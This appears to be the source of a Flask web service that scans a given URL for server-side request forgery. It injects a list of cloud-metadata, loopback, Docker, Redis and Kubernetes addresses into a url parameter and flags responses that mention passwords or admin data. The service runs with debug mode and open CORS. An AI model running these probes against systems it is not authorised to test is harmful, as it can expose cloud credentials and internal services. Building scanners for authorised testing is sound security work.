from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO
import requests

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Expanded List of SSRF Test URLs (Better Coverage)
TEST_URLS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS Metadata service
    "http://169.254.169.253/",  # Alternate AWS metadata service
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # Google Cloud metadata
    "http://localhost/",  # Localhost test
    "http://127.0.0.1/",  # Loopback address
    "http://192.168.1.1/",  # Common internal router IP
    "http://10.0.0.1/",  # Internal network IP
    "http://[::1]/",  # IPv6 loopback
    "http://docker.for.mac.host.internal/",  # Docker for Mac
    "http://host.docker.internal/",  # Docker internal service
    "http://172.17.0.1/",  # Docker bridge network
    "http://0.0.0.0/",  # Edge case testing
    "http://redis:6379/",  # Redis default service
    "http://kubernetes.default.svc/",  # Kubernetes internal service
]

# Function to get baseline response
def get_baseline_response(target_url, headers):
    try:
        response = requests.get(target_url, headers=headers, timeout=5, allow_redirects=False)
        return response.text if response.status_code == 200 else None
    except requests.exceptions.RequestException:
        return None

# Function to test for SSRF
def test_ssrf(target_url):
    socketio.emit("update", {"message": f"🚀 Starting SSRF test on: {target_url}"})
    print(f"🚀 Starting SSRF test on: {target_url}")  # Console log

    results = {}
    successful_attempts = 0

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    baseline_response = get_baseline_response(target_url, headers)

    for test_url in TEST_URLS:
        try:
            full_test_url = f"{target_url}?url={test_url}"
            response = requests.get(full_test_url, headers=headers, timeout=5, allow_redirects=False)

            if response.status_code == 200 and response.text and response.text != baseline_response:
                if any(keyword in response.text.lower() for keyword in ["metadata", "instance", "root", "password", "admin"]):
                    results[test_url] = "⚠️ **Potential SSRF detected! Sensitive data exposed.**"
                    socketio.emit("update", {"message": f"🔥 SSRF ALERT: {test_url} exposed sensitive data!"})
                else:
                    results[test_url] = "🟡 Response received but no sensitive data detected. Possible false positive."
                successful_attempts += 1
            elif response.status_code in [301, 302]:
                results[test_url] = "🟠 **Potential SSRF detected with redirection!**"
                socketio.emit("update", {"message": f"🔄 Redirect detected at: {test_url}!"})
                successful_attempts += 1
            else:
                results[test_url] = f"❌ Blocked (Status: {response.status_code})"
                socketio.emit("update", {"message": f"🔒 Blocked: {test_url} (Status {response.status_code})"})

        except requests.exceptions.Timeout:
            results[test_url] = "⏳ Timeout error - Possible firewall protection."
            socketio.emit("update", {"message": f"⏳ Timeout testing {test_url}. Possible protection in place."})
        except requests.exceptions.RequestException as e:
            results[test_url] = f"🚨 Error: {str(e)}"
            socketio.emit("update", {"message": f"🚨 Error testing {test_url}: {str(e)}"})

    if successful_attempts == 0:
        no_success_message = "✅ **SSRF Test Completed - No vulnerabilities found!**"
        print(no_success_message)
        socketio.emit("update", {"message": no_success_message})

    return {"success": True, "message": "SSRF testing completed.", "results": results}

# Flask API Endpoint
@app.route("/api/test-ssrf", methods=["POST"])
def test_ssrf_endpoint():
    try:
        data = request.json
        target_url = data.get("url")
        
        if not target_url:
            return jsonify({"success": False, "message": "Target URL is required."}), 400
        
        result = test_ssrf(target_url)
        return jsonify(result)
    except Exception as e:
        error_message = f"🚨 Server Error: {str(e)}"
        print(error_message)  # ✅ Log server-side errors
        return jsonify({"success": False, "message": error_message}), 500

if __name__ == "__main__":
    socketio.run(app, debug=True, port=5007)
